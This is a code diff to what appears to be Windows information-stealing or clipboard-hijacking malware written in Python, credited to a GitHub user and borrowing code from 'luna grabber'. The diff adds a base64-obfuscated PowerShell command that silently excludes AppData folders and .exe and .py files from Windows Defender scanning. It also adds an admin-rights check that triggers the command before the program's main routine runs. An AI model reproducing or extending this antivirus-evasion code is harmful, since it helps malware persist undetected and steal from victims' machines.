@@ -2,13 +2,13 @@
 written by: https://github.com/3022-2
 """
 
-
 import http.client
 import subprocess
 import socket
 import winreg
 import shutil
 import ctypes
+import base64
 import json
 import time
 import sys
@@ -33,6 +33,7 @@ single_use = False
 ping = False
 incubate = False
 false_error = False
+exclude_av = False
 
 webhook_url = ""
 
@@ -459,10 +460,31 @@ def check():
     except Exception:
         pass
 
+class disable_exclude_av:
+    """taken from luna grabber"""
+    def exclude():
+        cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnLCcucHknIg==').decode(errors="ignore")
+        try:
+            subprocess.run(cmd, shell=True, capture_output=True)
+        except Exception:
+            pass
+def check_admin():
+    try:
+        global is_admin
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+
+        if is_admin:
+            if exclude_av:
+                if cwd != str(os.path.join(os.environ['APPDATA'], "CLPPTH")):
+                    disable_exclude_av.exclude()
+    except Exception:
+        pass
+
 if __name__ == "__main__":
     try:
         if os.name == "nt":
             if comp_name not in ignore:
+                check_admin()
                 check()
     except Exception:
         pass
